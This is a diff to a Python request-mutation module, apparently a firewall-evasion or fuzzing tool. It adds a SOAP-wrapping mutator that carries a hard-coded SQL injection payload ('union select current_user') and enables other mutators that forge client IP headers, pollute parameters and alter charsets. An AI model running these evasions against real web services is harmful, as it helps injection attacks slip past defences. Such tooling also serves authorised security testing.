@@ -317,6 +317,41 @@ def mutant_methods_for_test_use(headers, url, method, data, files):
     logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
     return mutant_payloads
 
+def mutant_methods_transform_SOAP(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_transform_SOAP")
+    # logger.debug(TAG + "==>headers: " + str(headers))
+    # 构造SOAP请求的XML格式
+
+    soap_request =[f"""<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:header>
+            <soapenv:body>
+                <string>'{data}#</string>
+            </soapenv:body>
+        </soapenv:header>
+    </soapenv:envelope>""",f"""<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:header>
+            <soapenv:body>
+                <string>'union select current_user, 2#</string>
+            </soapenv:body>
+        </soapenv:header>
+    </soapenv:envelope>"""] 
+
+    modified_headers = copy.deepcopy(headers)
+    # print(modified_headers['Content-Type'])
+    modified_headers["Content-Type"] = "application/octet-stream,text/xml"
+
+    mutant_payloads = []
+
+    mutant_payloads.append({
+        'headers': modified_headers,
+        'url': url,
+        'method': method,
+        'data': random.choice(soap_request),
+        'files': files
+    })
+    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
+    return mutant_payloads
+
 def mutant_methods_change_extensions(headers, url, method, data, files):
     """
     生成不同的 Content-Type 和字符集变体
@@ -381,7 +416,7 @@ def mutant_methods_change_charset(headers, url, method, data, files):
     # content_type=random.choice(content_type_variations)
     # input()
     # 修改请求头中的 Content-Type
-    modified_headers = headers.copy()
+    modified_headers = copy.deepcopy(headers)
     # print(modified_headers['Content-Type'])
     modified_headers['Content-Type'] = content_type
     # print(content_type)
@@ -426,7 +461,7 @@ def mutant_methods_add_accept_charset(headers, url, method, data, files):
     weights = [0.66] + [0.03] * 8
     content_type= random.choices(charset_variations,weights=weights)[0]
     # 修改请求头中的 Content-Type
-    modified_headers = headers.copy()
+    modified_headers = copy.deepcopy(headers)
     # print(modified_headers['Content-Type'])
     modified_headers['Accept-Charset'] = content_type
     # print(headers)
@@ -476,7 +511,7 @@ def mutant_methods_fake_IP(headers, url, method, data, files):
     ]
     
     # 复制原始headers,避免修改原始对象
-    modified_headers = headers.copy()
+    modified_headers = copy.deepcopy(headers)
     
     # 随机选择要添加的头部数量(1-3个)
     num_headers_to_add = random.randint(1, 3)
@@ -520,7 +555,8 @@ def mutant_methods_peremeter_pollution_case1(headers, url, method, data, files):
 
 
     if data:
-
+        # print(data)
+        # input()
         plt_data=""
         if type(data)==str:
             if "=" in data:
@@ -1047,6 +1083,7 @@ mutant_methods_fake_IP
 mutant_methods_change_charset
 mutant_methods_add_accept_charset
 mutant_methods_change_extensions
+mutant_methods_transform_SOAP
 '''
 # 为变异方法添加开关
 mutant_methods_config = {
@@ -1056,7 +1093,7 @@ mutant_methods_config = {
     "mutant_methods_url_encoding": (mutant_methods_url_encoding, True),
     "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
     "mutant_methods_line_breaks": (mutant_methods_line_breaks, True),
-    "mutant_methods_add_padding": (mutant_methods_add_padding, False),
+    "mutant_methods_add_padding": (mutant_methods_add_padding, True),
     "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True),
     "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
     "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, True),
@@ -1068,12 +1105,14 @@ mutant_methods_config = {
     "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True),
     "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
     "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
-    # "mutant_methods_peremeter_pollution_case1": (mutant_methods_peremeter_pollution_case1, True),
-    # "mutant_methods_peremeter_pollution_case2": (mutant_methods_peremeter_pollution_case2, True),
-    # "mutant_methods_fake_IP": (mutant_methods_fake_IP, True),
-    # "mutant_methods_change_charset": (mutant_methods_change_charset, True),
-    # "mutant_methods_add_accept_charset": (mutant_methods_add_accept_charset, True),
-    # "mutant_methods_change_extensions": (mutant_methods_change_extensions, True),
+    "mutant_methods_peremeter_pollution_case1": (mutant_methods_peremeter_pollution_case1, True),
+    "mutant_methods_peremeter_pollution_case2": (mutant_methods_peremeter_pollution_case2, True),
+    "mutant_methods_fake_IP": (mutant_methods_fake_IP, True),
+    "mutant_methods_change_charset": (mutant_methods_change_charset, True),
+    "mutant_methods_add_accept_charset": (mutant_methods_add_accept_charset, True),
+    "mutant_methods_change_extensions": (mutant_methods_change_extensions, True),
+    "mutant_methods_transform_SOAP": (mutant_methods_transform_SOAP, False),
+    
 }
 
 # 初始化启用的变异方法
